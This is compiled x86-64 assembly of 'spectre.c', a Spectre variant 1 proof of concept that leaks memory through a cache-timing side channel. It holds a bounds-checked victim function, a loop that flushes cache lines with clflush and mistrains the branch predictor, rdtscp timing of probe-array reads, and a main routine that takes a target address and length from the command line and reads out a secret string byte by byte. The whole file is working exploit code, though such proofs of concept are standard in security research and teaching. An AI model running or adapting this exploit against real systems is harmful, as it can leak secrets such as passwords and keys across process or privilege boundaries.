	.file	"spectre.c"
	.intel_syntax noprefix
	.text
	.p2align 4
	.globl	check
	.type	check, @function
check:
.LFB5689:
	.cfi_startproc
	endbr64
	movsx	rax, DWORD PTR array1_size[rip]
	cmp	rax, rdi
	seta	al
	movzx	eax, al
	ret
	.cfi_endproc
.LFE5689:
	.size	check, .-check
	.p2align 4
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5690:
	.cfi_startproc
	endbr64
	movsx	rax, DWORD PTR array1_size[rip]
	cmp	rax, rdi
	jbe	.L3
	sub	edi, 1
	js	.L3
	movzx	ecx, BYTE PTR temp[rip]
	movsx	rdx, edi
	lea	rsi, array1[rip]
	lea	rdi, array2[rip]
	.p2align 4,,10
	.p2align 3
.L5:
	movzx	eax, BYTE PTR [rsi+rdx]
	sub	rdx, 1
	sal	eax, 9
	cdqe
	and	cl, BYTE PTR [rdi+rax]
	test	edx, edx
	jns	.L5
	mov	BYTE PTR temp[rip], cl
.L3:
	ret
	.cfi_endproc
.LFE5690:
	.size	victim_function, .-victim_function
	.p2align 4
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5691:
	.cfi_startproc
	endbr64
	push	r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	lea	r15, results[rip]
	mov	ecx, 128
	lea	r11, array2[rip]
	push	r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	mov	r9d, 999
	lea	r10, 131072[r11]
	push	r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	mov	r13d, 2863311531
	push	r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	push	rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	push	rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	lea	rbx, array1[rip]
	sub	rsp, 40
	.cfi_def_cfa_offset 96
	mov	QWORD PTR 8[rsp], rdi
	mov	rdi, r15
	lea	r8, 16[rsp]
	mov	rax, QWORD PTR fs:40
	mov	QWORD PTR 24[rsp], rax
	xor	eax, eax
	mov	DWORD PTR 16[rsp], 0
	rep stosq
.L8:
	lea	rax, array2[rip]
	.p2align 4,,10
	.p2align 3
.L9:
	clflush	[rax]
	add	rax, 512
	cmp	r10, rax
	jne	.L9
	mov	eax, r9d
	mov	ecx, DWORD PTR array1_size[rip]
	mov	r12, QWORD PTR 8[rsp]
	mov	r14d, 29
	cdq
	idiv	ecx
	movsx	rbp, edx
	xor	r12, rbp
	.p2align 4,,10
	.p2align 3
.L11:
	clflush	array1_size[rip]
	mov	DWORD PTR 20[rsp], 0
	mov	eax, DWORD PTR 20[rsp]
	cmp	eax, 99
	jg	.L13
	.p2align 4,,10
	.p2align 3
.L10:
	mov	eax, DWORD PTR 20[rsp]
	add	eax, 1
	mov	DWORD PTR 20[rsp], eax
	mov	eax, DWORD PTR 20[rsp]
	cmp	eax, 99
	jle	.L10
.L13:
	mov	eax, r14d
	imul	rax, r13
	shr	rax, 34
	lea	ecx, [rax+rax*2]
	mov	eax, r14d
	add	ecx, ecx
	sub	eax, ecx
	sub	eax, 1
	xor	ax, ax
	cdqe
	mov	rdi, rax
	shr	rdi, 16
	or	rdi, rax
	and	rdi, r12
	xor	rdi, rbp
	call	victim_function
	sub	r14d, 1
	jnb	.L11
	mov	esi, 13
	.p2align 4,,10
	.p2align 3
.L12:
	movzx	ebp, sil
	mov	r12d, ebp
	sal	r12d, 9
	rdtscp
	mov	rdi, rax
	sal	rdx, 32
	movsx	r12, r12d
	mov	DWORD PTR [r8], ecx
	or	rdi, rdx
	movzx	eax, BYTE PTR [r11+r12]
	rdtscp
	sal	rdx, 32
	mov	DWORD PTR [r8], ecx
	or	rax, rdx
	sub	rax, rdi
	cmp	rax, 50
	ja	.L14
	mov	eax, r9d
	mov	ecx, DWORD PTR array1_size[rip]
	cdq
	idiv	ecx
	movsx	rdx, edx
	movzx	eax, BYTE PTR [rbx+rdx]
	cmp	eax, ebp
	je	.L14
	add	DWORD PTR [r15+rbp*4], 1
.L14:
	add	esi, 167
	cmp	esi, 42765
	jne	.L12
	sub	r9d, 1
	jne	.L8
	mov	eax, DWORD PTR results[rip]
	xor	eax, DWORD PTR 16[rsp]
	mov	DWORD PTR results[rip], eax
	mov	rax, QWORD PTR 24[rsp]
	sub	rax, QWORD PTR fs:40
	jne	.L23
	add	rsp, 40
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	rbp
	.cfi_def_cfa_offset 40
	pop	r12
	.cfi_def_cfa_offset 32
	pop	r13
	.cfi_def_cfa_offset 24
	pop	r14
	.cfi_def_cfa_offset 16
	pop	r15
	.cfi_def_cfa_offset 8
	ret
.L23:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5691:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align 8
.LC0:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC1:
	.string	"%p"
.LC2:
	.string	"%d"
	.section	.rodata.str1.8
	.align 8
.LC3:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC4:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.8
	.align 8
.LC5:
	.string	"Reading at malicious_x = %p secc= %c sec_ascii=%d ...\n"
	.section	.rodata.str1.1
.LC6:
	.string	"result[%d]=%d "
.LC7:
	.string	"\n"
.LC8:
	.string	"addr = %llx, pid = %d\n"
	.section	.text.startup,"ax",@progbits
	.p2align 4
	.globl	main
	.type	main, @function
main:
.LFB5692:
	.cfi_startproc
	endbr64
	push	r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	push	r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	push	r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	push	r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	push	rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	push	rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	lea	rbx, .LC6[rip]
	sub	rsp, 88
	.cfi_def_cfa_offset 144
	mov	DWORD PTR 20[rsp], edi
	mov	QWORD PTR 24[rsp], rsi
	mov	rax, QWORD PTR fs:40
	mov	QWORD PTR 72[rsp], rax
	xor	eax, eax
.L25:
	mov	rdi, QWORD PTR stdin[rip]
	call	getc@PLT
	cmp	al, 114
	je	.L39
.L26:
	cmp	al, 10
	je	.L25
	cmp	al, 105
	jne	.L33
	xor	eax, eax
	call	getpid@PLT
	mov	edi, 1
	lea	rdx, check[rip+33]
	lea	rsi, .LC8[rip]
	mov	ecx, eax
	xor	eax, eax
	call	__printf_chk@PLT
	mov	rdi, QWORD PTR stdin[rip]
	call	getc@PLT
	cmp	al, 114
	jne	.L26
.L39:
	mov	rdx, QWORD PTR secret[rip]
	lea	rsi, .LC0[rip]
	mov	edi, 1
	xor	eax, eax
	lea	rbp, array1[rip]
	mov	rcx, rdx
	call	__printf_chk@PLT
	mov	rdi, QWORD PTR secret[rip]
	mov	rax, rdi
	sub	rax, rbp
	mov	QWORD PTR 48[rsp], rax
	call	strlen@PLT
	mov	edx, 131072
	mov	esi, 1
	lea	rdi, array2[rip]
	mov	DWORD PTR 44[rsp], eax
	mov	r12d, eax
	call	memset@PLT
	cmp	DWORD PTR 20[rsp], 3
	je	.L40
.L27:
	xor	eax, eax
	mov	edx, r12d
	mov	edi, 1
	lea	rsi, .LC4[rip]
	call	__printf_chk@PLT
	sub	DWORD PTR 44[rsp], 1
	js	.L25
	lea	rax, 70[rsp]
	xor	ebp, ebp
	lea	r14, 60[rsp]
	mov	QWORD PTR 8[rsp], rax
	lea	r15, .LC5[rip]
.L28:
	mov	rax, QWORD PTR secret[rip]
	mov	rdx, QWORD PTR 48[rsp]
	mov	rsi, r15
	mov	edi, 1
	lea	r13, results[rip+4]
	mov	r12d, 1
	movsx	ecx, BYTE PTR [rax+rbp]
	xor	eax, eax
	mov	r8d, ecx
	call	__printf_chk@PLT
	mov	rdi, QWORD PTR 48[rsp]
	mov	rsi, QWORD PTR 8[rsp]
	mov	rdx, r14
	lea	rax, 1[rdi]
	mov	QWORD PTR 48[rsp], rax
	call	readMemoryByte
	jmp	.L31
	.p2align 4,,10
	.p2align 3
.L30:
	add	r12d, 1
	add	r13, 4
	cmp	r12d, 256
	je	.L41
.L31:
	mov	ecx, DWORD PTR -4[r13]
	mov	eax, DWORD PTR 0[r13]
	lea	edx, -1[r12]
	cmp	ecx, eax
	jle	.L30
	mov	esi, ecx
	sub	esi, eax
	cmp	esi, 100
	jle	.L30
	mov	rsi, rbx
	mov	edi, 1
	xor	eax, eax
	call	__printf_chk@PLT
	mov	ecx, DWORD PTR 0[r13]
	mov	edx, r12d
	mov	rsi, rbx
	mov	edi, 1
	xor	eax, eax
	call	__printf_chk@PLT
	jmp	.L30
.L41:
	lea	rsi, .LC7[rip]
	mov	edi, 1
	xor	eax, eax
	add	rbp, 1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR 44[rsp]
	sub	eax, 1
	mov	DWORD PTR 44[rsp], eax
	test	eax, eax
	jns	.L28
	jmp	.L25
.L33:
	mov	rax, QWORD PTR 72[rsp]
	sub	rax, QWORD PTR fs:40
	jne	.L42
	add	rsp, 88
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	xor	eax, eax
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	rbp
	.cfi_def_cfa_offset 40
	pop	r12
	.cfi_def_cfa_offset 32
	pop	r13
	.cfi_def_cfa_offset 24
	pop	r14
	.cfi_def_cfa_offset 16
	pop	r15
	.cfi_def_cfa_offset 8
	ret
.L40:
	.cfi_restore_state
	mov	r15, QWORD PTR 24[rsp]
	lea	rdx, 48[rsp]
	lea	rsi, .LC1[rip]
	xor	eax, eax
	mov	rdi, QWORD PTR 8[r15]
	call	__isoc99_sscanf@PLT
	mov	rdi, QWORD PTR 16[r15]
	lea	rdx, 44[rsp]
	xor	eax, eax
	lea	rsi, .LC2[rip]
	sub	QWORD PTR 48[rsp], rbp
	call	__isoc99_sscanf@PLT
	mov	ecx, DWORD PTR 44[rsp]
	mov	rdx, QWORD PTR 48[rsp]
	xor	eax, eax
	lea	rsi, .LC3[rip]
	mov	edi, 1
	call	__printf_chk@PLT
	mov	r12d, DWORD PTR 44[rsp]
	jmp	.L27
.L42:
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5692:
	.size	main, .-main
	.local	results
	.comm	results,1024,32
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	secret
	.section	.rodata.str1.8
	.align 8
.LC9:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	.LC9
	.globl	array2
	.bss
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	unused2
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
